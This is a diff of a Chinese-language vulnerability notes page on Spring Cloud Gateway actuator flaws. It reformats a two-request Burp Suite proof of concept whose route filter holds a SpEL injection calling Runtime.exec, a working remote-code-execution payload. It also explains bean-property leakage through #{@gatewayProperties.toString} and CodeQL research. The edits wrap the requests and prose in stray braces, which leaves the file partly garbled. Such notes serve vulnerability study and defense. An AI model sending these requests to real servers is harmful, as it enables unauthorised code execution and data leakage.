@@ -40,15 +40,17 @@ CVE-2022-22946：HTTP2 不安全的 TrustManager :
 ### 来自白帽汇:
 #### 使用方法:burpsuite改包发送
 
-POST /actuator/gateway/routes/new_route HTTP/1.1    
+{
 
-   Host: 127.0.0.1:9000
+    POST /actuator/gateway/routes/new_route HTTP/1.1    
 
-   Connection: close
+    Host: 127.0.0.1:9000
 
-   Content-Type: application/json
+     Connection: close
 
-   {
+     Content-Type: application/json
+
+     {
 
      "predicates": [
 
@@ -66,7 +68,7 @@ POST /actuator/gateway/routes/new_route HTTP/1.1
 
      ],
 
-   "filters": [
+     "filters": [
 
      {
 
@@ -82,39 +84,47 @@ POST /actuator/gateway/routes/new_route HTTP/1.1
 
     }
 
-  ],
+     ],
 
- "uri": "https://wya.pl",
+    "uri": "https://wya.pl",
 
- "order": 0
+    "order": 0
+
+    }
 
 }
-
-POST /actuator/gateway/refresh HTTP/1.1
-
-Host: 127.0.0.1:9000
-
-Content-Type: application/json
-
-Connection: close
-
-Content-Length: 258
+# 第二段poc利用:
 
 {
+    
+    POST /actuator/gateway/refresh HTTP/1.1
 
- "predicate": "Paths: [/new_route], match trailing slash:true",
+    Host: 127.0.0.1:9000
 
- "route_id": "new_route",
+    Content-Type: application/json
 
- "filters": [
+    Connection: close
 
-   "[[RewritePath#{T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/x\")} =/${path}], order = 1]"
+    Content-Length: 258
 
-  ],
+    {
 
- "uri": "https://wya.pl",
+     "predicate": "Paths: [/new_route], match trailing slash:true",
 
- "order": 0
+    "route_id": "new_route",
+
+     "filters": [
+
+      "[[RewritePath#{T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/x\")} =/${path}], order = 1]"
+
+     ],
+
+    "uri": "https://wya.pl",
+
+     "order": 0
+
+    }
+
 
 }
 
@@ -126,18 +136,19 @@ Content-Length: 258
 ![image](https://user-images.githubusercontent.com/53851034/156774162-2db9bafc-c5d1-4046-9c72-e79649b76d86.png)
 
 
-SimpleEvaluationContext支持SpEL功能的一个子集，一般来说，它比StandardEvaluationContext更加安全。根据Javadocs的说法，“SimpleEvaluationContext只支持SpEL语言语法的一个子集，例如，不包括对Java类型、构造函数和Bean引用的引用。”
+{
+        
+        SimpleEvaluationContext支持SpEL功能的一个子集，一般来说，它比StandardEvaluationContext更加安全。根据Javadocs的说法，“SimpleEvaluationContext只支持SpEL语言语法的一个子集，例如，不包括对Java类型、构造函数和Bean引用的引用。”
 
-当我在研究这个问题时，我看到SpEL的原始需求来自GitHub repo上的一些问题：主要是用户希望实现一个可以通过SpEL表达式调用的自定义bean。一个例子是管理一个路由的速率限制。
-
-当我研究这个补丁的时候，我发现仍然可以调用没有方法参数的Bean——这意味着#{@gatewayProperties.toString}可以被用来打印出gatewayPropertiesBean的定义。而SimpleEvaluationContext是不允许调用#{@gatewayProperties.setRoutes(..)}的。这在本质上应该只限制getter方法被调用。
+{   
+        
+        当我在研究这个问题时，我看到SpEL的原始需求来自GitHub repo上的一些问题：主要是用户希望实现一个可以通过SpEL表达式调用的自定义bean。一个例子是管理一个路由的速率限制。当我研究这个补丁的时候，我发现仍然可以调用没有方法参数的Bean——这意味着#{@gatewayProperties.toString}可以被用来打印出gatewayPropertiesBean的定义。而SimpleEvaluationContext是不允许调用#{@gatewayProperties.setRoutes(..)}的。这在本质上应该只限制getter方法被调用。
 
 #### 或者:
 
-在使用添加和刷新路由所需的两个HTTP请求发送#{@gatewayproperties.tostring}后，可以看到上图所示内容。请注意，一些内部信息可能会遭到泄漏。根据可用的Bean，这可能被用来泄漏应用程序状态的属性或其他属性。
+    [在使用添加和刷新路由所需的两个HTTP请求发送#{@gatewayproperties.tostring}后，可以看到上图所示内容。请注意，一些内部信息可能会遭到泄漏。根据可用的Bean，这可能被用来泄漏应用程序状态的属性或其他属性。
+    虽然网关服务不用对类路径中包含的bean负责，但它至少应该确保它的库中的bean不会被调用，从而导致泄漏重要信息或对应用程序产生负面影响。]
 
-虽然网关服务不用对类路径中包含的bean负责，但它至少应该确保它的库中的bean不会被调用，从而导致泄漏重要信息或对应用程序产生负面影响。
-
-最后，我编写了更多的CodeQL查询，看看会发生什么情况。简单来说，我想在库中找到所有不带参数的方法的bean。然后，递归地查看返回类型，看看是否有任何没有参数的方法可以调用。这些查询看起来类似于bean1.method1.method2这个样子。
+    [最后，我编写了更多的CodeQL查询，看看会发生什么情况。简单来说，我想在库中找到所有不带参数的方法的bean。然后，递归地查看返回类型，看看是否有任何没有参数的方法可以调用。这些查询看起来类似于bean1.method1.method2这个样子。]
 
 
